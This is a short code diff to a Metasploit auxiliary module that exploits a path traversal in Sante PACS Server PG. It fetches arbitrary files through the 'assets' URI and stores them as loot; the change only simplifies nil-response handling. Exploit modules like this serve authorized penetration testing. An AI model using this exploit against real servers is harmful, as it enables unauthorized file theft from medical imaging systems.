@@ -58,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
       return CheckCode::Unknown('Connection failed')
     end
 
-    if res && res.code == 200
+    if res&.code == 200
       data = res.to_s
       if data.include?('Sante PACS Server PG')
         return CheckCode::Detected('Sante PACS Server PG seems to be running on the server.')
@@ -77,8 +77,7 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri(target_uri.path, 'assets', traversal)
     })
 
-    fail_with(Failure::Unknown, 'No response from server.') if res.nil?
-    fail_with(Failure::UnexpectedReply, 'Non-200 returned from server. If you believe the path is correct, try increasing the path traversal depth.') if res.code != 200
+    fail_with(Failure::UnexpectedReply, 'Non-200 returned from server. If you believe the path is correct, try increasing the path traversal depth.') if res&.code != 200
     print_good("File retrieved: #{target_uri.path}assets/#{traversal}")
 
     path = store_loot('pacsserver.file', 'text/plain', datastore['RHOSTS'], res.body, datastore['FILE'], 'File retrieved through PACS Server path traversal.')
